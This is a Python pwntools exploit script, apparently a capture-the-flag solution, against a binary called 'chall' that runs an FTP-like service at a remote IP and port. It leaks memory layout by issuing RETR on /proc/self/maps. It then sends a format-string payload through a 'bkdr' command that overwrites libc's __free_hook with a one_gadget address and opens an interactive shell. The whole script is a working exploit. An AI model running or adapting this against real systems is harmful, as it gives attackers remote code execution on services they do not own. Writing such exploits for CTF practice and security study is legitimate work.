from pwn import *

gs = '''
continue
'''

elf = context.binary = ELF("./chall")
libc = ELF("./libc.so.6")

def start():
    if args.REMOTE:
        return remote("94.237.61.84", 50326)
        #return remote("127.0.0.1", 1027)
    else:
        if args.GDB:
            return gdb.debug(elf.path, gdbscript=gs)
        else:
            return process(elf.path)

context.terminal = ['gnome-terminal', '-e']

io = start()

io.sendline(b"USER ;)")
io.sendline(b"PASS ;)")

"""
io.recv()
#input("PAUSE")

for i in range(1, 3000): # 3000
    io.sendline(f"bkdr ABCD.%{i}$p")
    io.recvuntil("431136 bkdr")
    print(i, io.recvline().strip())
"""

io.recv()

io.sendline(b"RETR /proc/self/maps")

data = io.recv().strip().decode()

print(data)

pie_match = re.search(r"([0-9a-f]+)-[0-9a-f]+.*?chall", data)
libc_match = re.search(r"([0-9a-f]+)-[0-9a-f]+.*?libc\.so", data)

pie_base = int(pie_match.group(1), 16) if pie_match else None
libc_base = int(libc_match.group(1), 16) if libc_match else None

print(f"PIE base: {hex(pie_base) if pie_base else 'Not found'}")
print(f"LIBC base: {hex(libc_base) if libc_base else 'Not found'}")
print(f"Free Hook: {hex(libc.sym.__free_hook)}")

elf.address = pie_base
libc.address = libc_base

one_gadget = [0xde78c, 0xde78f, 0xde792]

writes_dict = {
    libc.sym.__free_hook: libc.address + one_gadget[1]
}

offset = 1031

payload = fmtstr_payload(offset, writes_dict, numbwritten=12)
input("PAUSE")
io.sendline(b"bkdr " + payload)

io.interactive()